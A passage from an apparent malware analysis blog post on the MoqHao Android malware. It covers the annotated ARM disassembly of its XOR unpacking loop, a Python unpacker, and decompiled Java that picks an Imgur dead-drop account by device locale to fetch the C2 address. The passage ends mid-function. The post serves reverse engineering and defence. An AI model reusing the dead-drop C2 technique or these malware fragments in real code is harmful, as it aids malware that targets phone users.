</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cf6</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">fp</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cf8</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r1</span><span class="p">,</span> <span class="no">r5</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cfa</span> <span class="p">:</span> <span class="no">movs</span>	<span class="no">r2</span><span class="p">,</span> <span class="c1">#0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cfc</span> <span class="p">:</span> <span class="no">blx</span>	<span class="no">r3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cfe</span> <span class="p">:</span> <span class="no">add</span>	<span class="no">r6</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c1">#32
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d00</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r5</span><span class="p">,</span> <span class="no">fp</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">d02</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r9</span><span class="p">,</span> <span class="no">r0</span>          <span class="c1">; r9 = @(bytes array return by GetByteArrayElements)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d04</span> <span class="p">:</span> <span class="no">mov.w</span>	<span class="no">fp</span><span class="p">,</span> <span class="c1">#0          ; i = 0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d08</span> <span class="p">:</span> <span class="no">b.n</span>	<span class="mh">8d32</span> <span class="p">&lt;</span><span class="no">Java_s_ni_pi@@Base</span><span class="p">+</span><span class="mi">0x222</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; [*] Loop to XOR (byte per byte) the byte array with r4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d0a</span> <span class="p">:</span> <span class="no">ldrb.w</span>	<span class="no">r1</span><span class="p">,</span> <span class="p">[</span><span class="no">r9</span><span class="p">,</span> <span class="no">fp</span><span class="p">]</span>        <span class="c1">; r1 = resource[i], resource byte at index i
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d0e</span> <span class="p">:</span> <span class="no">ldrd</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">r2</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#36]       ; r0 = vector.lpLastData, r2 = vector.lpEnd
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d12</span> <span class="p">:</span> <span class="no">eors</span>	<span class="no">r1</span><span class="p">,</span> <span class="no">r4</span>              <span class="c1">; r1 ^= r4 (r4 is still equal to the 11th bytes of the resource)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d14</span> <span class="p">:</span> <span class="no">cmp</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">r2</span>              <span class="c1">; cmp vector.lpLastData == vector.lpEnd
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d16</span> <span class="p">:</span> <span class="no">strb.w</span>	<span class="no">r1</span><span class="p">,</span> <span class="p">[</span><span class="no">r7</span><span class="p">,</span> <span class="c1">#-185]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d1a</span> <span class="p">:</span> <span class="no">bcs.n</span>	<span class="mh">8d26</span> <span class="p">&lt;</span><span class="no">Java_s_ni_pi@@Base</span><span class="p">+</span><span class="mi">0x216</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">d1c</span> <span class="p">:</span> <span class="no">strb</span>	<span class="no">r1</span><span class="p">,</span> <span class="p">[</span><span class="no">r0</span><span class="p">,</span> <span class="c1">#0]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d1e</span> <span class="p">:</span> <span class="no">ldr</span>	<span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#36]   ; *(vector.lpLastData) = r1 (unxored byte) 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d20</span> <span class="p">:</span> <span class="no">adds</span>	<span class="no">r0</span><span class="p">,</span> <span class="c1">#1          ; vector.lpLastData += 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d22</span> <span class="p">:</span> <span class="no">str</span>	<span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#36]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d24</span> <span class="p">:</span> <span class="no">b.n</span>	<span class="mh">8d2e</span> <span class="p">&lt;</span><span class="no">Java_s_ni_pi@@Base</span><span class="p">+</span><span class="mi">0x21e</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">d26</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">r6</span>          <span class="c1">; r0 = @vector
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d28</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r1</span><span class="p">,</span> <span class="no">sl</span>          <span class="c1">; r1 = unxored byte
</span></span></span><span class="line"><span class="cl"><span class="c1">; https://stackoverflow.com/questions/51457322/what-is-stdvector-emplace-back-slow-path-stdvector-push-back-slow-path
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d2a</span> <span class="p">:</span> <span class="no">blx</span>	<span class="mh">7d70</span> <span class="p">&lt;</span><span class="no">_ZNSt6__ndk16vectorIaNS_9allocatorIaEEE21__push_back_slow_pathIaEEvOT_@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">d2e</span> <span class="p">:</span> <span class="no">add.w</span>	<span class="no">fp</span><span class="p">,</span> <span class="no">fp</span><span class="p">,</span> <span class="c1">#1      ; i = i + 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d32</span> <span class="p">:</span> <span class="no">cmp</span>	<span class="no">fp</span><span class="p">,</span> <span class="no">r8</span>          <span class="c1">; cmp i == number of bytes read by InputStream -&gt; int read(byte[] b)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">d34</span> <span class="p">:</span> <span class="no">blt.n</span>	<span class="mh">8d0a</span> <span class="p">&lt;</span><span class="no">Java_s_ni_pi@@Base</span><span class="p">+</span><span class="mi">0x1fa</span><span class="p">&gt;</span> <span class="c1">; jmp 0x8d0a (XOR loop)
</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>I would like to thanks <a class="link" href="https://www.securityhomework.net/"  target="_blank" rel="noopener"
    >Christophe</a> for helping me on the ARM reverse engineering.</p>
</blockquote>
<p>The resource (from the 12th byte to the end of the file) is XORed with the 11th byte of this same resource. So, we have the XOR key ! Let&rsquo;s write a Python script to automatically unpack the resource.</p>
<blockquote>
<p>The size of the unpack resource is indicated on bytes 8, 9 and 10 but is not used in the assembly code. We will use the size in the Python script to make it more stable.</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span><span class="p">,</span> <span class="n">exit</span> <span class="k">as</span> <span class="n">sys_exit</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">zlib</span> <span class="kn">import</span> <span class="n">decompress</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Unpack resource of MoqHao malware.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">resource</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="s2">&#34;.dex&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">dex</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">resource</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">|</span> <span class="n">data</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span> <span class="o">|</span> <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">        <span class="n">xor_key</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">dec</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">12</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">xor_key</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">dex</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decompress</span><span class="p">(</span><span class="n">dec</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Unpacked at &#39;&#34;</span> <span class="o">+</span> <span class="n">path</span> <span class="o">+</span> <span class="s2">&#34;.dex&#39;.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Usage : &#34;</span> <span class="o">+</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; &lt;resource&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">unpack</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Once we run the script, we get a Dalvik dex file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 unpack.py rosolhvtig/assets/xmdop/1eqlsfh
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Unpacked at <span class="s1">&#39;rosolhvtig/assets/xmdop/1eqlsfh.dex&#39;</span>.
</span></span><span class="line"><span class="cl">$ file rosolhvtig/assets/xmdop/1eqlsfh.dex
</span></span><span class="line"><span class="cl">rosolhvtig/assets/xmdop/1eqlsfh.dex: Dalvik dex file version <span class="m">035</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can check that our script works correctly by comparing the obtained file with the resource unpacked by MoqHao.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sha256sum rosolhvtig/assets/xmdop/1eqlsfh.dex
</span></span><span class="line"><span class="cl">3ec148623983c6f68b522a182d72330d93ed62e5f57db81c40b8bbad128e1541  rosolhvtig/assets/xmdop/1eqlsfh.dex
</span></span><span class="line"><span class="cl">$ adb shell sha256sum /data/data/fzicp.hmoj.zqzf.cnuxf/files/b
</span></span><span class="line"><span class="cl">3ec148623983c6f68b522a182d72330d93ed62e5f57db81c40b8bbad128e1541  /data/data/fzicp.hmoj.zqzf.cnuxf/files/b
</span></span></code></pre></td></tr></table>
</div>
</div><p>We are good ! Now, let&rsquo;s dive into the new DEX code analysis.</p>
<h3 id="retrieve-c2-url">Retrieve C2 URL
</h3><p>From the previous code analysis, we know that the unpacked resource is run by creating a new object of the class <code>com.Loader</code>.</p>
<p><img src="/img/moqhao-malware-analysis/b_structure.png"
	
	
	
	loading="lazy"
	
		alt="Unpacked resource structure"
	
	
></p>
<p><code>jadx-gui</code> gives us some statistics about the DEX file :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Classes: 615
</span></span><span class="line"><span class="cl">Methods: 2876
</span></span></code></pre></td></tr></table>
</div>
</div><p>We will not go through all the classes and methods, but only the more important ones.</p>
<p>In the code, we can see a lot of HTTP requests. To find where to start static code analysis, let&rsquo;s run the application with Burpsuite as proxy. Maybe we will obtain a good entry point to focus our research on.</p>
<p>When we start MoqHao, the following HTTP request is made :</p>
<p><img src="/img/moqhao-malware-analysis/imgur_request.png"
	
	
	
	loading="lazy"
	
		alt="Imgur Request"
	
	
></p>
<p>Here is the HTTP request in plaintext :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /user/shaoye99/about HTTP/2
</span></span><span class="line"><span class="cl">Host: imgur.com
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
</span></span><span class="line"><span class="cl">Accept: text/html,*/*;q=0.8
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, defate
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;0.8,en;q=0.6
</span></span><span class="line"><span class="cl">Cache-Control: no-cache
</span></span><span class="line"><span class="cl">Connection: Keep-Alive
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s visit the link, <code>hxxps://imgur.com/user/shaoye99/about</code> :</p>
<p><img src="/img/moqhao-malware-analysis/imgur_profile.png"
	
	
	
	loading="lazy"
	
		alt="Imgur Profile"
	
	
></p>
<p>The about section of the profile seems to contain encrypted data. Let&rsquo;s use the previous information to start static code analysis.</p>
<p>By searching for the string <code>shaoye99</code>, we came across the following line which is very interesting.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">f279m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;chrome|shaoye77@imgur|shaoye88@imgur|shaoye99@imgur&#34;</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>We can look for some cross-references and we get the following big function.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getDefaultAccounts</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">f279m</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">mo333a</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Loader</span><span class="p">.</span><span class="na">access$getPreferences$p</span><span class="p">(</span><span class="n">Loader</span><span class="p">.</span><span class="na">this</span><span class="p">).</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;addr_accounts&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Loader</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">getDefaultAccounts</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// string = &#34;chrome|shaoye77@imgur|shaoye88@imgur|shaoye99@imgur&#34;;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m321c</span><span class="p">(</span><span class="n">string</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;addrAccountsStr&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">m204M</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C0533v</span><span class="p">.</span><span class="na">m204M</span><span class="p">(</span><span class="n">string</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">char</span><span class="o">[]</span><span class="p">{</span><span class="sc">&#39;|&#39;</span><span class="p">},</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">6</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w"> </span><span class="c1">// split on &#39;|&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">locale</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Locale</span><span class="p">.</span><span class="na">getDefault</span><span class="p">().</span><span class="na">toString</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m321c</span><span class="p">(</span><span class="n">locale</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Locale.getDefault().toString()&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">m217i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C0532u</span><span class="p">.</span><span class="na">m217i</span><span class="p">(</span><span class="n">locale</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ko&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">m217i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">access$getPreferences$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Loader</span><span class="p">.</span><span class="na">access$getPreferences$p</span><span class="p">(</span><span class="n">Loader</span><span class="p">.</span><span class="na">this</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w"> </span><span class="c1">// if locale is &#39;ko&#39;, then use &#39;shaoye77@imgur&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">m217i2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C0532u</span><span class="p">.</span><span class="na">m217i</span><span class="p">(</span><span class="n">locale</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ja&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">m217i2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">access$getPreferences$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Loader</span><span class="p">.</span><span class="na">access$getPreferences$p</span><span class="p">(</span><span class="n">Loader</span><span class="p">.</span><span class="na">this</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">2</span><span class="p">);</span><span class="w"> </span><span class="c1">// if locale is &#39;ja&#39;, then use &#39;shaoye88@imgur&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">access$getPreferences$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Loader</span><span class="p">.</span><span class="na">access$getPreferences$p</span><span class="p">(</span><span class="n">Loader</span><span class="p">.</span><span class="na">this</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">3</span><span class="p">);</span><span class="w"> </span><span class="c1">// else use &#39;shaoye99@imgur&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">string2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">access$getPreferences$p</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;account&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// For french user, string2 = obj = &#39;shaoye99@imgur&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">(</span><span class="n">string2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;unknown&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m321c</span><span class="p">(</span><span class="n">string2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;account&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">m759g</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C0337t</span><span class="p">.</span><span class="na">m759g</span><span class="p">(</span><span class="n">string2</span><span class="p">);</span><span class="w"> </span><span class="c1">// Fetch C2 IP address</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="s">&#34;WS&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ACC:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">string2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">m759g</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Loader</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">f276j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;DNS ERROR&#34;</span><span class="p">;</span><span class="w">
